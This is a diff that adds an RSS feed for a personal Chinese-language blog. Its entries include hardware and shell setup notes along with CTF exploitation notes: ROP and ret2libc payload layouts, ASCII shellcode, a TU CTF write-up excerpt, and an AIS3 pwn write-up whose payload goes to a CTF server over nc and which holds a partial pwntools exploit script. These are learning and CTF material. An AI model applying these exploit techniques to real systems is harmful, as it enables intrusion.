@@ -1,0 +1,173 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Posts on Zet’s playground</title>
+    <link>https://blog.zet.tw/posts/</link>
+    <description>Recent content in Posts on Zet’s playground</description>
+    <image>
+      <url>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 05 Sep 2020 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.zet.tw/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ASRock IPMI reset</title>
+      <link>https://blog.zet.tw/posts/2020-09-05-asrock-ipmi-reset/</link>
+      <pubDate>Sat, 05 Sep 2020 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2020-09-05-asrock-ipmi-reset/</guid>
+      <description>因為在網路上買了一片 ASRock 的二手 server 主機板，想用 IPMI 的功能，不過密碼已經被改過了，所以上網找一下有沒有可以 reset 的方法
+首先可以用個隨便 windows 開機，下載 supermicro 的工具 IPMICFG
+https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI
+ipmicfg -user list Maximum number of Users : 10 Count of currently enabled Users : 1 User ID | User Name | Privilege Level | Enable --------|-----------|-----------------|------- 2 | admin | Administrator | Yes ipmicfg -user setpwd 2 admin 或是回到原廠設定
+ipmicfg -fd ref
+ https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/ https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc</description>
+    </item>
+    
+    <item>
+      <title>Use TTL to unbrick router</title>
+      <link>https://blog.zet.tw/posts/2018-08-17-use-ttl-to-unbrick-router/</link>
+      <pubDate>Fri, 17 Aug 2018 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2018-08-17-use-ttl-to-unbrick-router/</guid>
+      <description>之前刷 Router 的時候不小心把它刷爆了，變成磚，可以透過 FT232 工具把 Router 的殼拆掉，對接上面的 RS232，其中 GND, TX, RX 接到電腦可以直接下 command，也可以執行 system shell。
+使用 Putty 連接 FT232 的 COM Port，至於Router板子上面的腳位可以透過 DD-WRT 或是 Open-WRT 中的 Wiki，幾乎很多路由器都有可以參考的資料。
+例如：https://wiki.openwrt.org/toh/d-link/dir-300revb
+接上以後會出現以下選單，手速要快一點，選擇 &amp;ldquo;2&amp;rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。
+Please choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load system code then write to Flash via TFTP. 3: Boot system code via Flash (default). 4: Entr boot command line interface. 7: Load Boot Loader code then write to Flash via Serial.</description>
+    </item>
+    
+    <item>
+      <title>How to pwnalbe</title>
+      <link>https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/</link>
+      <pubDate>Tue, 09 Jan 2018 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/</guid>
+      <description>陸續更新～
+website, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
+https://github.com/snare/voltron </description>
+    </item>
+    
+    <item>
+      <title>一些環境</title>
+      <link>https://blog.zet.tw/posts/2016-08-05-evn/</link>
+      <pubDate>Fri, 05 Aug 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-08-05-evn/</guid>
+      <description>紀錄一下環境的東西，有什麼沒記錄到的之後再更新
+字體 等寬字體
+ monaco sourcecode pro Bitstream Vera Sans Mono ubuntu mono  硬體 架了一台家裡的server，跑debian，總耗電瓦數不超過30瓦，非常省電CP值超高!!!，唯一覺得可惜的是，SATA接頭只有2個而且主機板沒有支援RAID的功能
+mb:asus N3150M-E ram:8G storage:120G SSD + 1T 鍵盤 ducky one 80% 茶軸，自己換了PBT鍵帽，PBT摸起來感覺有種粉粉的感覺，也買好清理的，高度Cherry原廠鍵帽的高度，剛開始是OEM不過用個幾天就習慣了
+軟體 f.lux - 飽護眼睛 飽護眼睛的，可以讓白色變得比較黃一點，看久了眼睛不會那麼吃力，字體當然是要調大一點更好 Karabiner - 鍵盤映射 &amp;lt;https://pqrs.org/osx/karabiner/&amp;gt;可以調整osx 的映射鍵把F1-F12 換成，歌曲切換聲音調整之類的，另外我也用內建的工具把`Caps lock`換成 `ctrl`，這樣 tmux 比較好用 `Caps` + `a` 就行 parallels desktop - 虛擬機 融合模式超猛，偶爾開 IDA Pro 或是些win 的軟體 VANILLA &amp;lt;http://matthewpalmer.net/vanilla/&amp;gt; services docker - nginx - php - ubuntu for pwnable avahi-daemon (在區網中可以直接使用 hostname.</description>
+    </item>
+    
+    <item>
+      <title>Return Oriented Programming</title>
+      <link>https://blog.zet.tw/posts/2016-05-31-rop/</link>
+      <pubDate>Tue, 31 May 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-05-31-rop/</guid>
+      <description>整理一下
+找 getgads 工具  rp++ ROPgadget  Ret2libc 當程式有打開NX的時候造成 stack 上的 shellcode 無法執行，可以利用ret2libc或是利用ROP做mprotect開一個rwx的段，
+參數傳遞  x86 利用stack x86_64 利用reg  Ret2libc 疊法 可以盡可能的把參數疊完整，比較不會發生一些鳥問題
+一般x86的疊法是：
+padding + function + ret address + argv1 + argv2 + argv3 .... 一般 function 可以直接跳 .plt ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&amp;quot;/bin/sh&amp;quot;)，ret address 可以直接填空沒關係
+例如 :
+&amp;#39;A&amp;#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr) x64: 利用一些 pop reg 的getgads把reg設定好
+x32 參數直接疊在stack上，用 pop_ret 清掉用過的參數
+read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x00007fffffffffff  DynELF 假如在不知道對方libc 的情況下可以使用pwntools中的一個工具DynELF，給他一個leak的點，可以幫你找出function的位置</description>
+    </item>
+    
+    <item>
+      <title>TU CTF - Where Heretics Suffer</title>
+      <link>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</link>
+      <pubDate>Sat, 21 May 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</guid>
+      <description>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：
+80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
+    </item>
+    
+    <item>
+      <title>install qira on rpi</title>
+      <link>https://blog.zet.tw/posts/2016-03-16-install-qira-on-rpi/</link>
+      <pubDate>Wed, 16 Mar 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-03-16-install-qira-on-rpi/</guid>
+      <description>把install.sh裡面capstone的地方註解掉後執行
+下載capstone
+git clone https://github.com/aquynh/capstone.git $ ./make.sh $ sudo ./make.sh install </description>
+    </item>
+    
+    <item>
+      <title>ascii shellcode</title>
+      <link>https://blog.zet.tw/posts/2016-02-09-ascii-shellcode/</link>
+      <pubDate>Tue, 09 Feb 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-02-09-ascii-shellcode/</guid>
+      <description>可以使用alpha3這套工具，他會產生出具有encoder的ascii shellcode ， 利用本身的encoder去解碼，產生出來的shellcode很短，不過這類的shellcode需要一個reg去指向shellcode的起頭
+其他別種的有些是利用偏移去xor，最後jmp esp去執行
+紀錄一下一題題目的解法： 利用stack上的位置跟ROP的ret跳到那個位置上，再利用stack上的值去跟eax去做xor，利用的是像xor al,[esp+0x34]這類的op code，偏移的部分利用push eax 來填充，最後剛好使eax 指向我們shellcode的位置
+可以參考下方的參考資料
+References
+ http://inaz2.hatenablog.com/entry/2014/07/11/004655 http://inaz2.hatenablog.com/entry/2014/07/12/000007 http://inaz2.hatenablog.com/entry/2014/07/13/025626 https://code.google.com/archive/p/alpha3/ https://nets.ec/Ascii_shellcode </description>
+    </item>
+    
+    <item>
+      <title>zshrc</title>
+      <link>https://blog.zet.tw/posts/2016-02-07-zshrc/</link>
+      <pubDate>Sun, 07 Feb 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-02-07-zshrc/</guid>
+      <description>用過prezto與oh-my-zsh的zsh framework以後雖然很方便但是預設會載入一堆插件跟資料，導致開啟shell的時候會有延遲的感覺，尤其進入龐大的git資料夾的時候，速度慢到可以
+嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在Prompt的git訊息輸出到tmp裡面，等跑完以後在資料撈回Prompt
+大約如下：
+setopt prompt_subst # enable command substition in prompt autoload -Uz vcs_info zstyle &amp;#39;:vcs_info:*&amp;#39; enable bzr git hg svn zstyle &amp;#39;:vcs_info:*&amp;#39; check-for-changes true zstyle &amp;#39;:vcs_info:*&amp;#39; stagedstr &amp;#39;%F{green}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; unstagedstr &amp;#39;%F{yellow}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; formats &amp;#39; %b%c%u&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; actionformats &amp;#34; - [%b%c%u|%F{cyan}%a%f]&amp;#34; zstyle &amp;#39;:vcs_info:(sv[nk]|bzr):*&amp;#39; branchformat &amp;#39;%b|%F{cyan}%r%f&amp;#39; zstyle &amp;#39;:vcs_info:git*+set-message:*&amp;#39; hooks git_status ASYNC_PROC=0 ASYNC_DATA=&amp;#34;${TMPPREFIX}-prompt_sorin_data&amp;#34; function precmd() { function async() { vcs_info # save to temp file printf &amp;#34;%s&amp;#34; &amp;#34;${vcs_info_msg_0_}&amp;#34; &amp;gt; $ASYNC_DATA # signal parent kill -s USR1 $$ } # do not clear RPROMPT, let it persist # kill child if necessary if [[ &amp;#34;${ASYNC_PROC}&amp;#34; !</description>
+    </item>
+    
+    <item>
+      <title>linux kernel exploits tested</title>
+      <link>https://blog.zet.tw/posts/2016-01-05-linux-kernel-exploits-tested/</link>
+      <pubDate>Tue, 05 Jan 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-01-05-linux-kernel-exploits-tested/</guid>
+      <description>搜尋
+aptitude search linux-image- 安裝
+aptitude install linux-image-xxxx 或是上網找尋deb檔下載安裝
+wget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-image-3.16.0-30-generic_3.16.0-30.40~14.04.1_amd64.deb sudo dpkg -i *.deb 查看kernel安裝紀錄
+dpkg --get-selections | grep linux-image 移除舊kernel
+aptitude remove linux-image-3.19.0-18-generic linux kernel exploits db
+https://www.kernel-exploits.com/</description>
+    </item>
+    
+    <item>
+      <title>pwn tool list</title>
+      <link>https://blog.zet.tw/posts/2015-11-25-pwn-tool-list/</link>
+      <pubDate>Wed, 25 Nov 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2015-11-25-pwn-tool-list/</guid>
+      <description>ub 14.04 x64
+i32 lib apt-get install gcc-multilib cd /etc/apt/sources.list.d echo &amp;#34;deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse&amp;#34; &amp;gt;ia32-libs-raring.list apt-get update apt-get install ia32-libs dpkg --add-architecture i386 apt-get update apt-get install libssl-dev:i386 PEDA apt-get install nasm micro-inetd apt-get install libc6-dbg https://github.com/longld/peda qira https://github.com/BinaryAnalysisPlatform/qira
+pwntools 包含checksec, ROPgadget Tools
+sudo pip install git+https://github.com/Gallopsled/pwntools#egg=pwntools fix bug
+cp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/. rp++ https://github.com/0vercl0k/rp/downloads
+ncat sudo apt-get install netcat-traditional netcat-openbsd nmap </description>
+    </item>
+    
+    <item>
+      <title>AIS3 pwn</title>
+      <link>https://blog.zet.tw/posts/2015-11-24-ais3-pwn/</link>
+      <pubDate>Tue, 24 Nov 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2015-11-24-ais3-pwn/</guid>
+      <description>簡單紀錄一下
+PWN1 丟進ida 可以看到
+if ( v4 == 0x90909090 ) result = puts(aCensordCensord); else result = printf(&amp;#34;Your point is only %d, try hard!\n&amp;#34;, v4, v1, v2, v3); return result; 直接塞90結束
+python -c &amp;#39;print &amp;#34;\x90&amp;#34;*1000&amp;#39; | nc 52.69.163.194 1111 PWN2 定位到地20個字以後可以控制eip
+gdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08048364 _init 0x080483a0 read@plt 可以指到read上,一般來說長這樣
+call ret argv1 ￼argv2 argv3 可以控制read的返回地址跟參數,所以可以把ret跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好
+from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read_adr = &amp;#34;\xa0\x83\x04\x08&amp;#34; read = &amp;#34;\x00\x00\x00\x00&amp;#34; + &amp;#34;\x00\xa1\x04\x08&amp;#34; + &amp;#34;\x00\x01\x00\x00&amp;#34; p = &amp;#34;a&amp;#34;*20 + read_adr + &amp;#34;\x00\xa1\x04\x08&amp;#34; + read r.</description>
+    </item>
+    
+  </channel>
+</rss>
